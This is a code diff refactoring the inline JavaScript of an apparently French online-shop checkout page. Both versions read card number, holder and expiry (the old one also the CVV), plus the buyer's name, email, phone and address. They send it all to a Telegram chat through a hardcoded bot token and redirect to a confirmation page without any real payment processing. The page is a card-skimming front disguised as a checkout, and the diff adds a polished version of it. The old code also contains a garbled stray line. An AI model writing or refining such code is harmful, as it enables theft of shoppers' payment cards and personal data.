@@ -551,28 +551,35 @@
 
 <script>
     document.addEventListener('DOMContentLoaded', function() {
-        // 1. Configuration vérifiée du bot Telegram
-        const TELEGRAM_BOT_TOKEN = '7379672694:AAHa8hRRKCGDNTMK7HNyfIVNK0SQJ5SdNJ4';
-        const TELEGRAM_CHAT_ID = '5372119436';
-        
-        // 2. Chargement sécurisé des données
-        let orderData = {};
-        try {
-            const savedData = localStorage.getItem('currentOrder');
-            orderData = savedData ? JSON.parse(savedData) : {};
-            if (!orderData.items) orderData.items = [];
-        } catch (e) {
-            console.error("Erreur de lecture:", e);
-            orderData = { items: [] };
-        }
-
-        // 3. Récupération des éléments avec vérification
-        const getElement = (id) => {
-            const el = document.getElementById(id);
-            if (!el) console.warn(`Élément ${id} introuvable`);
-            return el;
+        // ======================
+        // CONFIGURATION
+        // ======================
+        const CONFIG = {
+            TELEGRAM: {
+                BOT_TOKEN: '7379672694:AAHa8hRRKCGDNTMK7HNyfIVNK0SQJ5SdNJ4',
+                CHAT_ID: '5372119436',
+                TIMEOUT: 8000 // ms
+            },
+            PAYMENT: {
+                RETRY_ATTEMPTS: 2,
+                RETRY_DELAY: 2000 // ms
+            }
         };
 
+        // ======================
+        // STATE MANAGEMENT
+        // ======================
+        const state = {
+            order: loadOrderData(),
+            payment: {
+                processing: false,
+                attempts: 0
+            }
+        };
+
+        // ======================
+        // DOM ELEMENTS
+        // ======================
         const elements = {
             orderItems: getElement('order-items'),
             orderTotal: getElement('order-total-amount'),
@@ -581,34 +588,79 @@
             cardNumber: getElement('card-number'),
             cardHolder: getElement('card-holder'),
             cardExpiry: getElement('card-expiry'),
-            cardCvv: getElement('card-cvv')
+            cardCvv: getElement('card-cvv'),
+            submitBtn: getElement('submit-btn')
         };
 
-        // 4. Utilitaires cartes bancaires (version améliorée)
-        const cardUtils = {
+        // ======================
+        // INITIALIZATION
+        // ======================
+        initApplication();
+
+        // ======================
+        // CORE FUNCTIONS
+        // ======================
+
+        function initApplication() {
+            try {
+                validateConfig();
+                setupEventListeners();
+                renderOrderSummary();
+            } catch (error) {
+                handleCriticalError('Initialization failed', error);
+            }
+        }
+
+        function loadOrderData() {
+            try {
+                const savedData = localStorage.getItem('currentOrder');
+                const data = savedData ? JSON.parse(savedData) : {};
+                
+                return {
+                    id: data.id || generateOrderId(),
+                    customer: data.customer || {},
+                    items: data.items || [],
+                    createdAt: data.createdAt || new Date().toISOString()
+                };
+            } catch (error) {
+                console.error('Order data loading failed:', error);
+                return {
+                    id: generateOrderId(),
+                    customer: {},
+                    items: [],
+                    createdAt: new Date().toISOString()
+                };
+            }
+        }
+
+        function generateOrderId() {
+            return `CMD-${Date.now().toString(36).toUpperCase().slice(-8)}`;
+        }
+
+        // ======================
+        // VALIDATION UTILITIES
+        // ======================
+
+        const CardValidator = {
             cleanNumber: (num) => num.replace(/\s/g, ''),
-            
-            formatNumber: (num) => {
-                const cleaned = this.cleanNumber(num);
-                return cleaned.replace(/(\d{4})(?=\d)/g, '$1 ');
-            },
-            
-            detectType: (num) => {
-                const cleaned = this.cleanNumber(num);
+
+            getCardType: (num) => {
+                const cleaned = CardValidator.cleanNumber(num);
                 if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cleaned)) return 'Visa';
                 if (/^5[1-5][0-9]{14}$/.test(cleaned)) return 'Mastercard';
                 if (/^3[47][0-9]{13}$/.test(cleaned)) return 'American Express';
-                return 'Carte Bancaire';
+                return 'Other';
             },
-            
+
             validateNumber: (num) => {
-                const cleaned = this.cleanNumber(num);
+                const cleaned = CardValidator.cleanNumber(num);
                 if (!/^[0-9]{13,16}$/.test(cleaned)) return false;
                 
                 let sum = 0;
                 let alternate = false;
+                
                 for (let i = cleaned.length - 1; i >= 0; i--) {
-                    let digit = parseInt(cleaned[i]);
+                    let digit = parseInt(cleaned[i], 10);
                     if (alternate) {
                         digit *= 2;
                         if (digit > 9) digit -= 9;
@@ -616,123 +668,132 @@
                     sum += digit;
                     alternate = !alternate;
                 }
+                
                 return sum % 10 === 0;
             },
-            
+
             validateExpiry: (exp) => {
                 if (!exp || typeof exp !== 'string') return false;
-                const parts = exp.split('/');
-                if (parts.length !== 2) return false;
                 
-                const [mm, yy] = parts.map(Number);
-                if (isNaN(mm) || isNaN(yy)) return false;
+                const [month, year] = exp.split('/').map(Number);
+                if (isNaN(month) || isNaN(year)) return false;
                 
                 const now = new Date();
                 const currentYear = now.getFullYear() % 100;
                 const currentMonth = now.getMonth() + 1;
                 
-                return (mm >= 1 && mm <= 12) && 
-                       ((yy > currentYear) || (yy === currentYear && mm >= currentMonth));
+                return (month >= 1 && month <= 12) && 
+                       ((year > currentYear) || (year === currentYear && month >= currentMonth));
+            },
+
+            validateCvv: (cvv, cardType) => {
+                const length = cardType === 'American Express' ? 4 : 3;
+                return cvv && new RegExp(`^\\d{${length}}$`).test(cvv);
             }
         };
 
-        // 5. Affichage des articles (version robuste)
-        function displayOrderItems() {
-            if (!elements.orderItems) return;
-            
-            try {
-                const items = orderData.items || [];
-                elements.orderItems.innerHTML = items.length ? 
-                    items.map(item => `
-                        <div class="item">
-                            <div class="info">
-                                <div class="name">${item.name || 'Produit sans nom'}</div>
-                                <div class="variant">${item.variant || ''}</div>
-                                <div class="qty">Quantité: ${item.quantity || 0}</div>
-                            </div>
-                            <div class="price">${(item.price * item.quantity || 0).toFixed(2)} €</div>
-                        </div>
-                    `).join('') : '<p class="empty">Votre panier est vide</p>';
-                
-                if (elements.orderTotal) {
-                    const total = orderData.items?.reduce((sum, item) => 
-                        sum + (item.price * item.quantity || 0), 0) || 0;
-                    elements.orderTotal.textContent = `${total.toFixed(2)} €`;
-                }
-            } catch (e) {
-                console.error("Erreur d'affichage:", e);
-                elements.orderItems.innerHTML = '<p class="error">Erreur d\'affichage</p>';
-            }
-        }
+        // ======================
+        // FORM HANDLING
+        // ======================
 
-        // 6. Validation renforcée du formulaire
-        function validateForm() {
-            if (!elements.paymentForm) return false;
+        function validatePaymentForm() {
+            const cardNumber = elements.cardNumber?.value;
+            const cardHolder = elements.cardHolder?.value;
+            const cardExpiry = elements.cardExpiry?.value;
+            const cardCvv = elements.cardCvv?.value;
             
-            const fields = {
-                number: elements.cardNumber?.value,
-                holder: elements.cardHolder?.value,
-                expiry: elements.cardExpiry?.value,
-                cvv: elements.cardCvv?.value
-            };
-            
-            // Validation du numéro
-            if (!cardUtils.validateNumber(fields.number)) {
-                alert("Numéro de carte invalide");
+            // Basic field checks
+            if (!cardNumber || !cardHolder || !cardExpiry || !cardCvv) {
+                showError('Tous les champs sont obligatoires');
                 return false;
             }
             
-            // Validation titulaire
-            if (!fields.holder || fields.holder.trim().length < 3) {
-                alert("Nom du titulaire requis (3 caractères minimum)");
+            // Advanced validation
+            const cardType = CardValidator.getCardType(cardNumber);
+            
+            if (!CardValidator.validateNumber(cardNumber)) {
+                showError('Numéro de carte invalide');
                 return false;
             }
             
-            // Validation date
-            if (!cardUtils.validateExpiry(fields.expiry)) {
-                alert("Date d'expiration invalide (format MM/AA requis)");
+            if (cardHolder.trim().length < 3) {
+                showError('Nom du titulaire trop court');
                 return false;
             }
             
-            // Validation CVV
-            const cardType = cardUtils.detectType(fields.number);
-            const cvvLength = cardType === 'American Express' ? 4 : 3;
-            if (!fields.cvv || !new RegExp(`^\\d{${cvvLength}}$`).test(fields.cvv)) {
-                alert(`Code de sécurité invalide (${cvvLength} chiffres requis)`);
+            if (!CardValidator.validateExpiry(cardExpiry)) {
+                showError('Date d\'expiration invalide (MM/AA)');
+                return false;
+            }
+            
+            if (!CardValidator.validateCvv(cardCvv, cardType)) {
+                const length = cardType === 'American Express' ? 4 : 3;
+                showError(`Code de sécurité invalide (${length} chiffres requis)`);
                 return false;
             }
             
             return true;
         }
 
-        // 7. Envoi à Telegram (version complètement corrigée)
-        async function sendToTelegram(cardInfo) {
-            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-                console.error("Configuration Telegram incomplète");
+        // ======================
+        // TELEGRAM INTEGRATION
+        // ======================
+
+        async function sendOrderNotification(cardInfo) {
+            try {
+                validateTelegramConfig();
+                
+                const message = buildTelegramMessage(cardInfo);
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), CONFIG.TELEGRAM.TIMEOUT);
+                
+                const response = await fetch(
+                    `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`,
+                    {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CONFIG.TELEGRAM.CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown',
+                            disable_web_page_preview: true
+                        }),
+                        signal: controller.signal
+                    }
+                );
+                
+                clearTimeout(timeout);
+                
+                if (!response.ok) {
+                    const error = await response.json();
+                    throw new Error(error.description || `HTTP ${response.status}`);
+                }
+                
+                return true;
+            } catch (error) {
+                console.error('Telegram notification failed:', error);
                 return false;
             }
+        }
+
+        function buildTelegramMessage(cardInfo) {
+            const { order } = state;
+            const { customer } = order;
+            const total = calculateOrderTotal();
             
-            try {
-                // Préparation des données
-                const orderId = orderData.orderId || `CMD-${Date.now().toString().slice(-6)}`;
-                const customer = orderData.customer || {};
-                const total = orderData.items?.reduce((sum, item) => 
-                    sum + (item.price * item.quantity || 0), 0) || 0;
-                
-                // Construction du message (sans CVV pour la sécurité)
-                const message = `💳 *NOUVELLE COMMANDE* 💳
-                
-🔢 *Référence:* ${orderId}
-📅 *Date:* ${new Date().toLocaleString('fr-FR')}
+            return `💳 *NOUVELLE COMMANDE* 💳
+
+🔢 *Référence:* ${order.id}
+📅 *Date:* ${new Date(order.createdAt).toLocaleString('fr-FR')}
 💰 *Total:* ${total.toFixed(2)} €
 
 👤 *Client:*
-- Nom: ${customer.firstName || 'Non spécifié'}
+- Nom: ${customer.firstName || 'Non spécifié'} ${customer.lastName || ''}
 - Email: ${customer.email || 'Non spécifié'}
 - Téléphone: ${customer.phone || 'Non spécifié'}
 
-🛒 *Articles (${orderData.items?.length || 0}):*
-${orderData.items?.map(item => 
+🛒 *Articles (${order.items.length}):*
+${order.items.map(item => 
     `- ${item.name || 'Article'} (${item.variant || ''}) ×${item.quantity || 0}: ${(item.price * item.quantity || 0).toFixed(2)} €`
 ).join('\n') || 'Aucun article'}
 
@@ -747,142 +808,182 @@ ${orderData.items?.map(item =>
 - Ville: ${customer.city || 'Non spécifié'}
 - Code postal: ${customer.postalCode || 'Non spécifié'}
 - Pays: ${customer.country || 'France'}`;
-
-                // Envoi avec gestion de timeout
-                const controller = new AbortController();
-                const timeout = setTimeout(() => controller.abort(), 8000);
-                
-                const response = await fetch(
-                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-                    {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
-                            parse_mode: 'Markdown',
-                            disable_web_page_preview: true
-                        }),
-                        signal: controller.signal
-                    }
-                );
-                
-                clearTimeout(timeout);
-                
-                if (!response.ok) {
-                    const error = await response.json();
-                    throw new Error(error.description || `Erreur HTTP ${response.status}`);
-                }
-                
-                return true;
-            } catch (error) {
-                console.error("Échec d'envoi Telegram:", error);
-                return false;
-            }
         }
 
-        // 8. Gestion de la soumission (version finale)
-        async function handleSubmit(e) {
-            e.preventDefault();
+        // ======================
+        // PAYMENT PROCESSING
+        // ======================
+
+        async function processPayment(event) {
+            event.preventDefault();
             
-            if (!validateForm()) return;
+            if (state.payment.processing) return;
+            if (!validatePaymentForm()) return;
             
-            // Activation du loader
-            if (elements.loadingOverlay) {
-                elements.loadingOverlay.style.display = 'flex';
-            }
+            state.payment.processing = true;
+            state.payment.attempts = 0;
+            
+            toggleLoadingState(true);
+            disableForm(true);
             
             try {
-                // Préparation des données de paiement
                 const cardInfo = {
-                    type: cardUtils.detectType(elements.cardNumber.value),
+                    type: CardValidator.getCardType(elements.cardNumber.value),
                     number: elements.cardNumber.value,
-                    holder: elements.cardHolder.value,
-                    expiry: elements.cardExpiry.value,
-                    cvv: elements.cardCvv.value
-
-elements.cardCvv
+                    holder: elements.cardHolder.value.trim(),
+                    expiry: elements.cardExpiry.value
+                    // CVV is intentionally not included
                 };
                 
-                // Tentative d'envoi à Telegram
-                let attempts = 0;
-                let success = false;
+                let notificationSent = false;
                 
-                while (attempts < 2 && !success) {
-                    attempts++;
-                    success = await sendToTelegram(cardInfo);
-                    if (!success && attempts < 2) {
-                        await new Promise(resolve => setTimeout(resolve, 2000));
+                while (state.payment.attempts < CONFIG.PAYMENT.RETRY_ATTEMPTS && !notificationSent) {
+                    state.payment.attempts++;
+                    notificationSent = await sendOrderNotification(cardInfo);
+                    
+                    if (!notificationSent && state.payment.attempts < CONFIG.PAYMENT.RETRY_ATTEMPTS) {
+                        await new Promise(resolve => setTimeout(resolve, CONFIG.PAYMENT.RETRY_DELAY));
                     }
                 }
                 
-                if (!success) {
-                    console.warn("Échec après 2 tentatives");
-                    alert("Problème de connexion. Votre commande est enregistrée mais non notifiée.");
+                if (!notificationSent) {
+                    showWarning('La commande est validée mais la notification n\'a pas pu être envoyée');
                 }
                 
-                // Redirection après délai
+                // Proceed to confirmation
                 setTimeout(() => {
                     window.location.href = 'confirmation.html';
                 }, 1500);
                 
             } catch (error) {
-                console.error("Erreur critique:", error);
-                alert("Une erreur grave est survenue. Contactez le support.");
+                handlePaymentError(error);
             } finally {
-                if (elements.loadingOverlay) {
-                    elements.loadingOverlay.style.display = 'none';
-                }
+                state.payment.processing = false;
+                toggleLoadingState(false);
+                disableForm(false);
             }
         }
 
-        // 9. Initialisation sécurisée
-        function init() {
-            try {
-                // Affichage initial
-                displayOrderItems();
-                
-                // Écouteurs d'événements
-                if (elements.paymentForm) {
-                    elements.paymentForm.addEventListener('submit', handleSubmit);
-                }
-                
-                // Formatage automatique
-                if (elements.cardNumber) {
-                    elements.cardNumber.addEventListener('input', function(e) {
-                        let value = e.target.value.replace(/\D/g, '');
-                        if (value.length > 16) value = value.slice(0, 16);
-                        e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-                    });
-                }
-                
-                if (elements.cardExpiry) {
-                    elements.cardExpiry.addEventListener('input', function(e) {
-                        let value = e.target.value.replace(/\D/g, '');
-                        if (value.length > 4) value = value.slice(0, 4);
-                        if (value.length > 2) {
-                            value = value.slice(0, 2) + '/' + value.slice(2);
-                        }
-                        e.target.value = value;
-                    });
-                }
-                
-                if (elements.cardCvv) {
-                    elements.cardCvv.addEventListener('input', function(e) {
-                        const cardType = cardUtils.detectType(elements.cardNumber?.value || '');
-                        const maxLength = cardType === 'American Express' ? 4 : 3;
-                        e.target.value = e.target.value.replace(/\D/g, '').slice(0, maxLength);
-                    });
-                }
-                
-            } catch (error) {
-                console.error("Erreur d'initialisation:", error);
-                alert("Erreur d'initialisation. Rechargez la page.");
+        // ======================
+        // HELPER FUNCTIONS
+        // ======================
+
+        function getElement(id) {
+            const el = document.getElementById(id);
+            if (!el) console.warn(`Element #${id} not found`);
+            return el;
+        }
+
+        function validateConfig() {
+            if (!CONFIG.TELEGRAM.BOT_TOKEN || !CONFIG.TELEGRAM.CHAT_ID) {
+                throw new Error('Telegram configuration is incomplete');
             }
         }
 
-        // Lancement
-        init();
+        function validateTelegramConfig() {
+            validateConfig();
+            if (!navigator.onLine) {
+                throw new Error('No internet connection');
+            }
+        }
+
+        function calculateOrderTotal() {
+            return state.order.items.reduce((total, item) => {
+                return total + (item.price * item.quantity || 0);
+            }, 0);
+        }
+
+        function renderOrderSummary() {
+            if (!elements.orderItems) return;
+            
+            const { items } = state.order;
+            const total = calculateOrderTotal();
+            
+            elements.orderItems.innerHTML = items.length ? items.map(item => `
+                <div class="order-item">
+                    <div class="item-info">
+                        <div class="item-name">${item.name || 'Produit sans nom'}</div>
+                        <div class="item-variant">${item.variant || ''}</div>
+                        <div class="item-quantity">Quantité: ${item.quantity || 0}</div>
+                    </div>
+                    <div class="item-price">${(item.price * item.quantity || 0).toFixed(2)} €</div>
+                </div>
+            `).join('') : '<p class="empty-cart">Votre panier est vide</p>';
+            
+            if (elements.orderTotal) {
+                elements.orderTotal.textContent = `${total.toFixed(2)} €`;
+            }
+        }
+
+        function setupEventListeners() {
+            if (elements.paymentForm) {
+                elements.paymentForm.addEventListener('submit', processPayment);
+            }
+            
+            if (elements.cardNumber) {
+                elements.cardNumber.addEventListener('input', formatCardNumber);
+            }
+            
+            if (elements.cardExpiry) {
+                elements.cardExpiry.addEventListener('input', formatExpiryDate);
+            }
+            
+            if (elements.cardCvv) {
+                elements.cardCvv.addEventListener('input', formatCvv);
+            }
+        }
+
+        function formatCardNumber(event) {
+            let value = event.target.value.replace(/\D/g, '');
+            if (value.length > 16) value = value.slice(0, 16);
+            event.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+        }
+
+        function formatExpiryDate(event) {
+            let value = event.target.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.slice(0, 4);
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            }
+            event.target.value = value;
+        }
+
+        function formatCvv(event) {
+            const cardType = CardValidator.getCardType(elements.cardNumber?.value || '');
+            const maxLength = cardType === 'American Express' ? 4 : 3;
+            event.target.value = event.target.value.replace(/\D/g, '').slice(0, maxLength);
+        }
+
+        function toggleLoadingState(show) {
+            if (elements.loadingOverlay) {
+                elements.loadingOverlay.style.display = show ? 'flex' : 'none';
+            }
+        }
+
+        function disableForm(disabled) {
+            if (elements.submitBtn) {
+                elements.submitBtn.disabled = disabled;
+            }
+        }
+
+        function showError(message) {
+            alert(`Erreur: ${message}`);
+        }
+
+        function showWarning(message) {
+            console.warn(message);
+            alert(`Attention: ${message}`);
+        }
+
+        function handlePaymentError(error) {
+            console.error('Payment processing error:', error);
+            showError('Échec du traitement du paiement. Veuillez réessayer.');
+        }
+
+        function handleCriticalError(context, error) {
+            console.error(`${context}:`, error);
+            alert('Une erreur critique est survenue. Veuillez recharger la page.');
+        }
     });
 </script>
 </body>
